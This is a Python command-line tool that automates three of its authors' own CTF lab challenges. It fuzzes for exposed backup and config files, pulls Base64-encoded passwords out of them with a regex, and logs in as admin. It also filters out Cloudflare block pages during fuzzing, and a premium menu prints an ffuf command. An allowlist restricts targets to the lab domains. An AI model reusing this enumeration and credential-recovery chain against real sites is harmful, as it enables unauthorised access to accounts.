#!/usr/bin/env python3
"""
HXSecurity Terminal

Consent-first local CLI for H0RII/HXSecurity controlled CTF labs.

Plans:
- ADMIN: full lab automation for owned/authorized HXSecurity tests.
- PREMIUM: guided/manual mode for public training use.

This tool is intentionally scoped to H0RII/HXSecurity-owned lab domains by default.
"""
from __future__ import annotations

import base64
import getpass
import hashlib
import http.cookiejar
import json
import os
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Iterable, Optional

# Public-safe default: Admin is locked unless a key hash is provided by env.
LOCAL_DEFAULT_ADMIN_CODE_SHA256 = ""
USER_AGENT = "curl/8.0 HXSecurity-Terminal/0.3"
REQUEST_TIMEOUT = 10
ADMIN_VERIFY_URL = os.environ.get("HXSECURITY_ADMIN_VERIFY_URL", "https://lab.hxsecurity.net/api/terminal/admin/verify")

ALLOWED_HOSTS = {
    "lab.hxsecurity.net",
    "home.hxsecurity.net",
    "hxsecurity.net",
    "localhost",
    "127.0.0.1",
}
ALLOWED_SUFFIXES = (
    ".hxsecurity.net",
    ".horii.dev",
)

DEFAULT_WORDS = [
    "config",
    "settings",
    "app",
    "portal",
    "deployment",
    "site-config",
    "service",
    "backup",
    "admin",
    "database",
    "db",
    "env",
    "old",
    "archive",
    "release",
    "ops",
    "support",
    "maintenance",
]

DEFAULT_EXTENSIONS = [
    "",
    ".bak",
    ".backup",
    ".old",
    ".save",
    ".conf",
    ".config",
    ".ini",
    ".env",
    ".txt",
    ".json",
    ".yml",
    ".yaml",
]

B64_LINE_RE = re.compile(r"(?im)^\s*([A-Z0-9_]*(?:PASSWORD|PASS|SECRET|TOKEN)[A-Z0-9_]*)\s*=\s*([A-Za-z0-9+/=]{8,})\s*$")
SUCCESS_TEXT = "TEST 1 SUCCESS, WELCOME BACK HACKER!"
TEST2_SUCCESS_TEXT = "TEST 2 SUCCESS, ACCESS CHAIN COMPLETE!"
TEST3_SUCCESS_TEXT = "TEST 3 SUCCESS, RELEASE TRACE COMPLETE!"
PATH_RE = re.compile(r"/[-A-Za-z0-9_./]+")


@dataclass
class HttpResult:
    url: str
    status: int
    body: bytes
    headers: object

    @property
    def size(self) -> int:
        return len(self.body)

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", errors="replace")


class HXTerminal:
    def __init__(self) -> None:
        self.cookiejar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookiejar))
        self.context = ssl.create_default_context()

    def request(self, url: str, *, method: str = "GET", data: Optional[bytes] = None) -> HttpResult:
        req = urllib.request.Request(
            url,
            data=data,
            method=method,
            headers={
                "User-Agent": USER_AGENT,
                "Accept": "text/html,application/xhtml+xml,application/xml,text/plain,*/*;q=0.8",
            },
        )
        try:
            with self.opener.open(req, timeout=REQUEST_TIMEOUT) as resp:
                return HttpResult(url, int(resp.status), resp.read(), resp.headers)
        except urllib.error.HTTPError as e:
            return HttpResult(url, int(e.code), e.read(), e.headers)

    def enumerate_files(self, base_url: str, words: Iterable[str] = DEFAULT_WORDS, exts: Iterable[str] = DEFAULT_EXTENSIONS) -> list[HttpResult]:
        hits: list[HttpResult] = []
        total = 0
        for word in words:
            word = word.strip().strip("/")
            if not word:
                continue
            for ext in exts:
                total += 1
                path = f"/{word}{ext}"
                url = urllib.parse.urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
                res = self.request(url)
                if res.status in {200, 204, 301, 302, 307, 401, 403} and not is_generic_block(res):
                    hits.append(res)
                    print(f"[hit] {res.status} {res.size:>6} {path}")
                time.sleep(0.03)
        print(f"[enum] checked {total} candidates, usable hits={len(hits)}")
        return hits

    def find_b64_artifact(self, base_url: str, words: Iterable[str] = DEFAULT_WORDS, exts: Iterable[str] = DEFAULT_EXTENSIONS) -> tuple[Optional[str], Optional[str], Optional[str]]:
        total = 0
        for word in words:
            word = word.strip().strip("/")
            if not word:
                continue
            for ext in exts:
                total += 1
                path = f"/{word}{ext}"
                url = urllib.parse.urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
                res = self.request(url)
                if res.status in {200, 204, 301, 302, 307, 401, 403} and not is_generic_block(res):
                    print(f"[hit] {res.status} {res.size:>6} {path}")
                    found = extract_b64_secret(res.text)
                    if found:
                        key, secret = found
                        print(f"[enum] checked {total} candidates, stopping on credential marker")
                        return key, secret, url
                time.sleep(0.03)
        print(f"[enum] checked {total} candidates, no credential marker found")
        return None, None, None

    def run_test1_auto(self, start_url: str) -> bool:
        base_url = normalize_base_url(start_url)
        assert_allowed_target(base_url)
        print(f"[test1] target: {base_url}")
        print("[test1] enumerating exposed backup/config artifacts...")
        secret_key, secret, secret_url = self.find_b64_artifact(base_url)

        if not secret:
            print("[test1] no Base64 credential marker found in discovered files")
            print("[hint] Try adding a larger authorized wordlist, but keep scope to this lab.")
            return False

        print(f"[test1] credential marker found: {secret_key}")
        print(f"[test1] artifact URL: {secret_url}")
        print("[test1] decoded credential recovered")
        print("[test1] recovered username: admin")
        print(f"[test1] recovered password: {secret}")

        login_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", "login")
        body = urllib.parse.urlencode({"username": "admin", "password": secret}).encode()
        res = self.request(login_url, method="POST", data=body)
        # urllib follows redirects through opener by default, so success page should be final body.
        if SUCCESS_TEXT in res.text:
            print(SUCCESS_TEXT)
            return True
        print(f"[test1] login did not reach success page; status={res.status} size={res.size}")
        return False


    def run_test2_auto(self, start_url: str) -> bool:
        base_url = normalize_base_url(start_url)
        assert_allowed_target(base_url)
        print(f"[test2] target: {base_url}")
        print("[test2] tracing robots/header clue chain...")
        login_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", "test2/login")
        login = self.request(login_url)
        build = header_get(login.headers, "x-hx-build")
        if login.status != 200 or not build:
            print(f"[test2] missing Test 2 login/header clue; status={login.status}")
            return False
        print("[test2] login/header clue recovered")

        robots = self.request(urllib.parse.urljoin(base_url.rstrip("/") + "/", "robots.txt"))
        if robots.status != 200:
            print(f"[test2] robots.txt unavailable; status={robots.status}")
            return False
        note_paths = [p for p in PATH_RE.findall(robots.text) if p.startswith("/test2/")]
        if not note_paths:
            print("[test2] no Test 2 path found in robots.txt")
            return False
        print("[test2] robots clue recovered")

        manifest_path: Optional[str] = None
        note_url: Optional[str] = None
        for note_path in note_paths:
            current_note_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", note_path.lstrip("/"))
            note = self.request(current_note_url)
            if note.status == 200 and build in note.text:
                note_url = current_note_url
                candidates = [p for p in PATH_RE.findall(note.text) if p.startswith("/test2/")]
                for candidate in candidates:
                    if build in candidate:
                        manifest_path = candidate
                        break
            if manifest_path:
                break
        if not manifest_path:
            manifest_path = f"/test2/releases/{build}.manifest"
        print("[test2] notes/build clue recovered")

        manifest_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", manifest_path.lstrip("/"))
        manifest = self.request(manifest_url)
        if manifest.status != 200:
            print(f"[test2] manifest unavailable; status={manifest.status}")
            return False
        artifact_paths = [p for p in PATH_RE.findall(manifest.text) if p.startswith("/test2/") and ("bak" in p or "config" in p)]
        if not artifact_paths:
            print("[test2] no backup/config artifact path found in manifest")
            return False
        print("[test2] manifest clue recovered")

        secret: Optional[str] = None
        secret_key: Optional[str] = None
        artifact_url: Optional[str] = None
        for artifact_path in artifact_paths:
            current_artifact_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", artifact_path.lstrip("/"))
            artifact = self.request(current_artifact_url)
            if artifact.status == 200:
                found = extract_b64_secret(artifact.text)
                if found:
                    secret_key, secret = found
                    artifact_url = current_artifact_url
                    break
        if not secret:
            print("[test2] no Base64 credential marker found in chained artifact")
            return False
        print(f"[test2] credential marker found: {secret_key}")
        if note_url:
            print(f"[test2] notes URL: {note_url}")
        print(f"[test2] manifest URL: {manifest_url}")
        print(f"[test2] artifact URL: {artifact_url}")
        print("[test2] decoded credential recovered")
        print("[test2] recovered username: admin")
        print(f"[test2] recovered password: {secret}")

        body = urllib.parse.urlencode({"username": "admin", "password": secret}).encode()
        res = self.request(login_url, method="POST", data=body)
        if TEST2_SUCCESS_TEXT in res.text:
            print(TEST2_SUCCESS_TEXT)
            return True
        print(f"[test2] login did not reach success page; status={res.status} size={res.size}")
        return False


    def run_test3_auto(self, start_url: str) -> bool:
        base_url = normalize_base_url(start_url)
        assert_allowed_target(base_url)
        print(f"[test3] target: {base_url}")
        print("[test3] tracing security/header/runbook/manifest chain...")
        login_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", "test3/login")
        login = self.request(login_url)
        release = header_get(login.headers, "x-hx-release")
        if login.status != 200 or not release:
            print(f"[test3] missing Test 3 login/header clue; status={login.status}")
            return False
        print("[test3] login/header clue recovered")

        security_url: Optional[str] = None
        security_body = ""
        for candidate in ["security.txt", ".well-known/security.txt"]:
            url = urllib.parse.urljoin(base_url.rstrip("/") + "/", candidate)
            res = self.request(url)
            if res.status == 200 and "Policy:" in res.text:
                security_url = url
                security_body = res.text
                break
        if not security_url:
            print("[test3] security policy clue unavailable")
            return False
        policy_paths = [p for p in PATH_RE.findall(security_body) if p.startswith("/test3/")]
        if not policy_paths:
            print("[test3] no Test 3 policy path found")
            return False
        print("[test3] security policy clue recovered")

        runbook_path: Optional[str] = None
        disclosure_url: Optional[str] = None
        for policy_path in policy_paths:
            current_disclosure_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", policy_path.lstrip("/"))
            disclosure = self.request(current_disclosure_url)
            if disclosure.status == 200 and "Runbook pattern" in disclosure.text:
                disclosure_url = current_disclosure_url
                # The release is intentionally supplied by the login header.
                runbook_path = f"/test3/runbooks/{release}.txt"
                break
        if not runbook_path:
            print("[test3] no runbook clue found")
            return False
        print("[test3] disclosure/runbook clue recovered")

        runbook_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", runbook_path.lstrip("/"))
        runbook = self.request(runbook_url)
        if runbook.status != 200 or release not in runbook.text:
            print(f"[test3] runbook unavailable or release mismatch; status={runbook.status}")
            return False
        manifest_paths = [p for p in PATH_RE.findall(runbook.text) if p.startswith("/test3/") and "manifest" in p]
        if not manifest_paths:
            print("[test3] no manifest path found in runbook")
            return False
        print("[test3] runbook clue recovered")

        manifest_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", manifest_paths[0].lstrip("/"))
        manifest = self.request(manifest_url)
        if manifest.status != 200:
            print(f"[test3] manifest unavailable; status={manifest.status}")
            return False
        artifact_paths = [p for p in PATH_RE.findall(manifest.text) if p.startswith("/test3/") and ("bak" in p or "config" in p)]
        if not artifact_paths:
            print("[test3] no backup/config artifact path found in manifest")
            return False
        print("[test3] manifest clue recovered")

        secret: Optional[str] = None
        secret_key: Optional[str] = None
        artifact_url: Optional[str] = None
        for artifact_path in artifact_paths:
            current_artifact_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", artifact_path.lstrip("/"))
            artifact = self.request(current_artifact_url)
            if artifact.status == 200:
                found = extract_b64_secret(artifact.text)
                if found:
                    secret_key, secret = found
                    artifact_url = current_artifact_url
                    break
        if not secret:
            print("[test3] no Base64 credential marker found in chained artifact")
            return False
        print(f"[test3] credential marker found: {secret_key}")
        print(f"[test3] security URL: {security_url}")
        if disclosure_url:
            print(f"[test3] disclosure URL: {disclosure_url}")
        print(f"[test3] runbook URL: {runbook_url}")
        print(f"[test3] manifest URL: {manifest_url}")
        print(f"[test3] artifact URL: {artifact_url}")
        print("[test3] decoded credential recovered")
        print("[test3] recovered username: admin")
        print(f"[test3] recovered password: {secret}")

        body = urllib.parse.urlencode({"username": "admin", "password": secret}).encode()
        res = self.request(login_url, method="POST", data=body)
        if TEST3_SUCCESS_TEXT in res.text:
            print(TEST3_SUCCESS_TEXT)
            return True
        print(f"[test3] login did not reach success page; status={res.status} size={res.size}")
        return False


def is_generic_block(res: HttpResult) -> bool:
    text = res.text[:6000]
    if res.status == 403 and "cloudflare" in text.lower() and "attention required" in text.lower():
        return True
    # HXSecurity observed Cloudflare ffuf block pages are ~4550 bytes. Treat same-size 403 as noise.
    if res.status == 403 and 4300 <= res.size <= 4800 and "cloudflare" in text.lower():
        return True
    return False


def extract_b64_secret(text: str) -> Optional[tuple[str, str]]:
    for key, raw in B64_LINE_RE.findall(text):
        try:
            decoded = base64.b64decode(raw, validate=True).decode("utf-8")
        except Exception:
            continue
        if 6 <= len(decoded) <= 128 and all(ch not in decoded for ch in "\r\n\x00"):
            return key, decoded
    return None


def header_get(headers: object, name: str) -> Optional[str]:
    wanted = name.lower()
    try:
        items = headers.items()  # type: ignore[attr-defined]
    except Exception:
        return None
    for key, value in items:
        if str(key).lower() == wanted:
            return str(value)
    return None


def normalize_base_url(value: str) -> str:
    value = value.strip()
    if not value:
        raise SystemExit("No URL provided.")
    if not re.match(r"^https?://", value, re.I):
        value = "https://" + value
    parsed = urllib.parse.urlparse(value)
    if not parsed.netloc:
        raise SystemExit("Invalid URL.")
    return f"{parsed.scheme}://{parsed.netloc}"


def assert_allowed_target(base_url: str) -> None:
    host = urllib.parse.urlparse(base_url).hostname or ""
    if host in ALLOWED_HOSTS or any(host.endswith(suffix) for suffix in ALLOWED_SUFFIXES):
        return
    raise SystemExit(f"Refusing target outside authorized lab allowlist: {host}")


def verify_remote_admin_code(code: str) -> bool:
    if not ADMIN_VERIFY_URL:
        return False
    data = urllib.parse.urlencode({"code": code}).encode()
    req = urllib.request.Request(
        ADMIN_VERIFY_URL,
        data=data,
        method="POST",
        headers={"User-Agent": USER_AGENT, "Accept": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=REQUEST_TIMEOUT) as resp:
            body = json.loads(resp.read().decode("utf-8"))
            return int(resp.status) == 200 and body.get("ok") is True and body.get("plan") == "admin"
    except Exception:
        return False


def check_admin_code() -> bool:
    code = getpass.getpass("ADMIN ACCESS CODE: ")
    expected = os.environ.get("HXSECURITY_ADMIN_KEY_SHA256")
    if expected:
        digest = hashlib.sha256(code.encode()).hexdigest()
        if digest == expected:
            return True
    return verify_remote_admin_code(code)


def check_premium_code() -> bool:
    expected = os.environ.get("HXSECURITY_PREMIUM_KEY_SHA256")
    if not expected:
        print("Premium plan is locked: no premium access key has been issued yet.")
        return False
    code = getpass.getpass("PREMIUM ACCESS KEY: ")
    digest = hashlib.sha256(code.encode()).hexdigest()
    return digest == expected


def pause_before_exit() -> None:
    if sys.stdin.isatty():
        try:
            input("\nPress Enter to exit...")
        except EOFError:
            pass


def premium_menu() -> None:
    if not check_premium_code():
        print("Access denied.")
        pause_before_exit()
        raise SystemExit(1)
    print("\nPREMIUM PLAN - $9.99/month")
    print("- guided hints")
    print("- manual commands")
    print("- no automatic credential recovery/login")
    print("\nTest 1 manual flow:")
    print('  ffuf -u https://lab.hxsecurity.net/FUZZ -w wordlist.txt -e .bak,.old,.env,.conf -mc 200 -H "User-Agent: curl/8.0"')
    print("  curl the discovered file")
    print("  base64 -d the credential value")
    print("  login as admin")


def admin_menu() -> None:
    if not check_admin_code():
        print("Access denied.")
        pause_before_exit()
        raise SystemExit(1)
    term = HXTerminal()
    while True:
        print("\nADMIN PLAN - FULL LAB AUTOMATION")
        print("1) Auto-run HXSecurity Test 1")
        print("2) Auto-run HXSecurity Test 2")
        print("3) Auto-run HXSecurity Test 3")
        print("4) Show registered tests")
        print("0) Exit")
        choice = input("hxsecurity> ").strip()
        if choice == "1":
            url = input("Start URL/domain: ").strip() or "https://lab.hxsecurity.net/login"
            ok = term.run_test1_auto(url)
            print("[result] PASS" if ok else "[result] FAIL")
        elif choice == "2":
            url = input("Start URL/domain: ").strip() or "https://lab.hxsecurity.net/test2/login"
            ok = term.run_test2_auto(url)
            print("[result] PASS" if ok else "[result] FAIL")
        elif choice == "3":
            url = input("Start URL/domain: ").strip() or "https://lab.hxsecurity.net/test3/login"
            ok = term.run_test3_auto(url)
            print("[result] PASS" if ok else "[result] FAIL")
        elif choice == "4":
            print("Registered tests:")
            print("- test1: exposed backup/config artifact with Base64 credential, admin login validation")
            print("- test2: chained robots/header/manifest clue with Base64 credential, admin login validation")
            print("- test3: chained security/header/runbook/manifest clue with Base64 credential, admin login validation")
        elif choice == "0":
            return
        else:
            print("Unknown choice.")


def main() -> None:
    print("HXSecurity Terminal")
    print("Consent-first CTF/lab automation for owned H0RII/HXSecurity targets.")
    print("\nChoose plan:")
    print("1) ADMIN PLAN - all tools / full lab automation")
    print("2) PREMIUM PLAN - $9.99/month guided mode")
    print("0) Exit")
    choice = input("plan> ").strip()
    if choice == "1":
        admin_menu()
    elif choice == "2":
        premium_menu()
    elif choice == "0":
        return
    else:
        print("Unknown choice.")
        pause_before_exit()
        raise SystemExit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBye.")
        sys.exit(130)
